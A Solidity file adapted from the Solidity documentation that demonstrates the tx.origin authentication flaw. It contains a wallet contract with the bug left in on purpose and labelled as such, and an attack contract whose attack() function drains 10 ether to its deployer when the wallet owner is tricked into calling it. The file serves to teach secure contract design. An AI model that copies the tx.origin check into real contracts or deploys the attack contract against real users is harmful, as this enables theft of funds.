// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

// Modify from https://docs.soliditylang.org/en/latest/security-considerations.html?#tx-origin
// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
	address public owner;

	constructor() payable {
		owner = msg.sender;
	}

	receive() external payable {}

	function transferTo(address payable dest, uint256 amount) public {
		// THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin
		require(tx.origin == owner, 'check failed');
		dest.transfer(amount);
	}
}

contract TxAttackWallet {
	address public owner;
	address public attackContract;

	constructor(address _addr) {
		owner = msg.sender;
		attackContract = _addr;
	}

	function attack() external {
		(bool success, ) = attackContract.call(
			abi.encodeWithSignature('transferTo(address,uint256)', owner, 10 ether)
		);
		require(success, 'failed');
	}
}
